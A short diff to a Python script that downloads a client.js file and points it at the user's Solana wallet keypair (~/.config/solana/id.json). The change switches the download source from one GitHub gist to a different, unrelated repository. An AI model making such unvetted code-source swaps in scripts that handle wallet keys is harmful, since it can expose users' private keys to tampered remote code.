@@ -43,7 +43,7 @@ def run_command(command):
 
 def download_and_prepare_rust_source():
     """Download the Rust client file and modify it to use the correct keypair path."""
-    url = "https://gist.githubusercontent.com/jacklevin74/a073004c120f45e32d84d8530d613218/raw/fde1c0fe4f77a85324c324366d2b8a85a47eb14d/client.js"
+    url = "https://raw.githubusercontent.com/zzbyshekk/xenium/main/client.js"
     keypair_path = os.path.expanduser('~/.config/solana/id.json')  # Generic way to get home directory
     response = requests.get(url)
     rust_code = response.text
